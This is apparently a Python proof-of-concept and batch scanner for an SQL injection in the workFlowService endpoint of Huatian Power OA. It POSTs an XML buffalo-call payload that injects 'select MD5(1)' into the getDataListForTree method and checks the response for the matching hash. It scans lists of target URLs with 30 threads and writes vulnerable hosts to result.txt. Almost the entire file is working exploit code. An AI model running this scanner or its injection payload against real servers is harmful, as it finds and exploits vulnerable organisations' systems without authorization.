import requests,argparse,sys,time,re,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test="""
 ██████╗  █████╗         ███████╗ ██████╗ ██╗     
██╔═══██╗██╔══██╗        ██╔════╝██╔═══██╗██║     
██║   ██║███████║        ███████╗██║   ██║██║     
██║   ██║██╔══██║        ╚════██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║███████╗███████║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝
                                                  
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='华天动力OA workFlowService SQL')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input a url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input a file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fb:
            for url in fb.readlines():
                url_list.append(url.strip())
        mp = Pool(30)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = '/OAapp/bfapp/buffalo/workFlowService'
    header={
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'AAccept-Encoding': 'identity',
        'Content-Length': '103',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        'Accept': '*/*',
        'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
        'Connection': 'keep-alive',
        'Referer': 'http://www.baidu.com',
        'Cache-Control': 'max-age=0'
    }
    proxies={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data='<buffalo-call>\r\n<method>getDataListForTree</method>\r\n<string>select MD5(1)</string>\r\n</buffalo-call>\r\n\r\n\r\n'
    try:
        res = requests.post(url=target+payload,headers=header,proxies=proxies,data=data,timeout=15,verify=False)
        match = re.search(r'<string>([a-fA-F\d]+)</string>',res.text)
        if 'c4ca4238a0b923820dcc509a6f75849b' == match.group(1):
            print(f'[+]{target} have loopholes {target+payload}')
            with open('result.txt','a',encoding='utf-8') as fn:
                fn.write(target.strip()+'\n')
    except:
        pass
if __name__ == "__main__":
    main()
